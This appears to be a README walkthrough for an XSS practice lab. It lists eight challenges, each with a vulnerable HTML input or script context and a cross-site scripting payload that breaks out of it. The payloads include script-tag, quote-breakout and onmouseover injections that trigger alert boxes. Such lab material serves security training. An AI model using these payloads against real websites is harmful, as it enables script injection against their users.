# XSS-Practice-Lab


### Lab Link : http://leettime.net/xsslab1/chalg1.php

### Author : Sheikh Rishad

<XSS Practice Lab/>


Challenge_1:

    <input type="text" name="name"></input>

payload :   

    <script>alert(1)</script>




Challenge_2:

     <input type="text" name="name" value=hack></input>

payload :  

     ><script>alert(document.URL)</script>


Challenge_3:

     <input type="text" name="name" value="hack"></input>

payload :  

    "><script>alert(document.URL)</script>


Challenge_4:

     <input type="text" name="name" value='hack'></input>

payload :   
 
    '><script>alert(document.URL)</script>


Challenge_5:

    <center><script>var search_str="hack";</script>

payload :   
  
    </script><script>alert(document.URL)</script>


Challenge_6:

     <center><script>var search_str='hack';</script>

payload : 
  
    </script><script>alert(document.URL)</script>


Challenge_7:

     <input type="text" name="name" value='<scriptalert("hack")</script'></input>

payload :   
 
    'onmouseover='alert(document.URL);


Challenge_8:

    <input type="text" name="name" value='&gt;&lt;script&gt;alert(1)&lt;/script&gt;'></input>

payload :   
       
    "onmouseover="alert(document.URL);
